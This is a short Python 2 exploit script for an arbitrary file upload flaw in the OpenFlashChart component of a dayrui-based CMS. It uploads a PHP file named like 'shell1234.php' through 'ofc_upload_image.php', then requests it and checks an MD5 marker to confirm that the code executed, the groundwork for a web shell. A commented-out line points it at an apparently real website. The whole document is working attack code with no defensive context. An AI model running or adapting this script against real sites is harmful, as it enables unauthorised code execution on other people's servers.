# coding:utf-8
import urllib2
import random
import re

class Exploit:

    def attack(self, url):
        fileName = "shell" + str(random.randrange(1000, 9999)) + ".php"
        target = url + '/dayrui/libraries/Chart/ofc_upload_image.php?name=' + fileName

        req = urllib2.Request(target, headers={"Content-Type": "application/oct"})
        res = urllib2.urlopen(req, data="<?print(md5(0x22))?>").read()

        url = url + '/dayrui/libraries/tmp-upload-images/' + fileName
        if re.search(r'tmp-upload-images', res):
            res = urllib2.urlopen(url).read()
            if re.search(r'e369853df766fa44e1ed0ff613f563bd', res):
                return "[Upload Success] {}/dayrui/libraries/tmp-upload-images/{}".format(url, fileName)

# print Exploit().attack("http://www.wfeng.net/")